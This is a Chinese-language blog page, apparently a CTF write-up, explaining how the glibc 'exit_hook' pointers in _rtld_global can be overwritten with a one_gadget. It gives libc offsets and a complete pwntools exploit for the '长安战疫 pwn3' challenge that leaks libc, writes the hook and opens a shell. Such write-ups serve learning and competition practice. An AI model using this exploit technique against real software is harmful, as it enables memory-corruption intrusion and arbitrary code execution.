@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.mark0519.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[PWN] exit_hook以前只接触过__malloc_hook，__free_hook，大概意思就是在调用malloc和free的时候会先看看里面有没有东西，有的话就会执行。 前几天做题时遇到了只能修改exit()函数的题目，了解到存在一类指针也可以被称之为exit_hook,做题时选择了直接调用，现在在仔细研究下原理。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="exit_hook在pwn题中的应用">
+<meta property="og:url" content="https://blog.mark0519.com/post/pwn-exit-hook.html">
+<meta property="og:site_name" content="Mark&#39;s blog">
+<meta property="og:description" content="[PWN] exit_hook以前只接触过__malloc_hook，__free_hook，大概意思就是在调用malloc和free的时候会先看看里面有没有东西，有的话就会执行。 前几天做题时遇到了只能修改exit()函数的题目，了解到存在一类指针也可以被称之为exit_hook,做题时选择了直接调用，现在在仔细研究下原理。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imgdb.cn/item/61daab292ab3f51d91d8629a.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/61daad752ab3f51d91da14eb.png">
+<meta property="article:published_time" content="2022-01-09T09:06:07.000Z">
+<meta property="article:modified_time" content="2022-01-09T09:45:19.530Z">
+<meta property="article:author" content="Mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="exit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/61daab292ab3f51d91d8629a.png">
+
+<link rel="canonical" href="https://blog.mark0519.com/post/pwn-exit-hook.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>exit_hook在pwn题中的应用 | Mark's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mark's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.mark0519.com/post/pwn-exit-hook.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+      <meta itemprop="name" content="Mark0519">
+      <meta itemprop="description" content="菜鸡CTFer的自留地">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          exit_hook在pwn题中的应用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-09 17:06:07 / 修改时间：17:45:19" itemprop="dateCreated datePublished" datetime="2022-01-09T17:06:07+08:00">2022-01-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="PWN-exit-hook"><a href="#PWN-exit-hook" class="headerlink" title="[PWN] exit_hook"></a>[PWN] exit_hook</h1><p>以前只接触过<code>__malloc_hook</code>，<code>__free_hook</code>，大概意思就是在调用malloc和free的时候会先看看里面有没有东西，有的话就会执行。</p>
+<p>前几天做题时遇到了只能修改<code>exit()</code>函数的题目，了解到存在一类指针也可以被称之为<code>exit_hook</code>,做题时选择了直接调用，现在在仔细研究下原理。</p>
+<span id="more"></span>
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>先自己写一个小程序，使用GDB调试着看看</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编译<code>gcc -g t.c -o t </code>并尝试调试</p>
+<p>调试发现，调用链为</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">call   exit@plt &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">call __run_exit_handlers&lt;__run_exit_handlers&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">call   rdx &lt;_dl_fini&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://pic.imgdb.cn/item/61daab292ab3f51d91d8629a.png"></p>
+<p>接下来为了方便观察，可以直接看<code>_dl_fini.c</code>的相关源码：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">SHARED</span></span>
+	<span class="token keyword">int</span> do_audit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	again<span class="token operator">:</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span>Lmid_t ns <span class="token operator">=</span> <span class="token function">GL</span><span class="token punctuation">(</span>dl_nns<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> ns <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>ns<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token comment">/* Protect against concurrent loads and unloads.  */</span>
+		<span class="token function">__rtld_lock_lock_recursive</span> <span class="token punctuation">(</span><span class="token function">GL</span><span class="token punctuation">(</span>dl_load_lock<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+		<span class="token keyword">unsigned</span> <span class="token keyword">int</span> nloaded <span class="token operator">=</span> <span class="token function">GL</span><span class="token punctuation">(</span>dl_ns<span class="token punctuation">)</span><span class="token punctuation">[</span>ns<span class="token punctuation">]</span><span class="token punctuation">.</span>_ns_nloaded<span class="token punctuation">;</span>
+		<span class="token comment">/* No need to do anything for empty namespaces or those used forauditing DSOs.  */</span>
+    
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>nloaded <span class="token operator">==</span> <span class="token number">0</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">SHARED</span></span>
+		<span class="token operator">||</span> <span class="token function">GL</span><span class="token punctuation">(</span>dl_ns<span class="token punctuation">)</span><span class="token punctuation">[</span>ns<span class="token punctuation">]</span><span class="token punctuation">.</span>_ns_loaded<span class="token operator">-></span>l_auditing <span class="token operator">!=</span> do_audit
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+		<span class="token punctuation">)</span>
+	<span class="token function">__rtld_lock_unlock_recursive</span> <span class="token punctuation">(</span><span class="token function">GL</span><span class="token punctuation">(</span>dl_load_lock<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看8行和18行，发现是调用了 <code>__rtld_lock_lock_recursive</code> 和 <code>__rtld_lock_unlock_recursive</code> 。</p>
+<p>在程序中寻找这两个函数：</p>
+<p><img src="https://pic.imgdb.cn/item/61daad752ab3f51d91da14eb.png"></p>
+<p>最终找到这两个函数在_rtld_global结构体里面。只要我们将其中一个指向one_gadgets，在CTF中，就可以拿到shell了。</p>
+<p>接下来就是计算偏移了，发现在64位libc-2.23中，这两个指针在结构体中的偏移分别是3848和3856。为了方便，我们可以直接记住这两个指针和libc的基地址之间的距离。 </p>
+<p>在libc-2.23中<br><strong>exit_hook = libc_base+0x5f0040+3848</strong></p>
+<p><strong>exit_hook = libc_base+0x5f0040+3856</strong></p>
+<p>在libc-2.27中</p>
+<p><strong>exit_hook = libc_base+0x619060+3840</strong></p>
+<p><strong>exit_hook = libc_base+0x619060+3848</strong></p>
+<p>这样一来，只要知道libc版本和任意地址的写，我们可以直接写这个指针，执行exit后就可以拿到shell了。</p>
+<p>其实不用非要执行exit，就程序正常返回也可以执行到这里</p>
+<h2 id="长安战”疫“-pwn3"><a href="#长安战”疫“-pwn3" class="headerlink" title="长安战”疫“ pwn3"></a>长安战”疫“ pwn3</h2><p>题目设计了一个游戏，通过strcmp的<code>\x00</code>字符覆盖size来构造很大leavel通过检查，之后就可以修改任意地址8字节</p>
+<p>这个遇到的问题就是任意修改8字节之后程序就会运行<code>exit(0)</code>,所以这里我们需要修改exit_hook来覆盖为ogg拿到shell</p>
+<p>完整exp:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span>
+
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>
+
+local <span class="token operator">=</span> <span class="token number">0</span>
+
+<span class="token keyword">if</span> local<span class="token punctuation">:</span>
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"113.201.14.253"</span><span class="token punctuation">,</span><span class="token string">"16033"</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    cmd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me a character level :"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">leavelup</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    cmd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me another level :"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">startgame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    cmd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+
+create<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+leavelup<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>
+leavelup<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x99</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>
+startgame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Here's your reward: "</span><span class="token punctuation">)</span>
+addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+puts_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>
+libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>
+exit_hook <span class="token operator">=</span> libc_addr<span class="token operator">+</span><span class="token number">0x5f0040</span><span class="token operator">+</span><span class="token number">3848</span>
+p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"your name:"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>exit_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"e made for you!"</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_addr <span class="token operator">+</span> <span class="token number">0xf1247</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># gdb.attach(p)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
+0x45226 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4527a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf03a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1247 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''</span>
+<span class="token comment"># flag&#123;3901afdc7f79dedfdb062a241eb3a575&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/exit/" rel="tag"># exit</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/wp-%E7%BE%8E%E5%9B%A2CTF2021.html" rel="prev" title="MTCTF2021">
+      <i class="fa fa-chevron-left"></i> MTCTF2021
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN-exit-hook"><span class="nav-number">1.</span> <span class="nav-text">[PWN] exit_hook</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%95%BF%E5%AE%89%E6%88%98%E2%80%9D%E7%96%AB%E2%80%9C-pwn3"><span class="nav-number">1.2.</span> <span class="nav-text">长安战”疫“ pwn3</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mark0519"
+      src="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+  <p class="site-author-name" itemprop="name">Mark0519</p>
+  <div class="site-description" itemprop="description">菜鸡CTFer的自留地</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mark0519</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
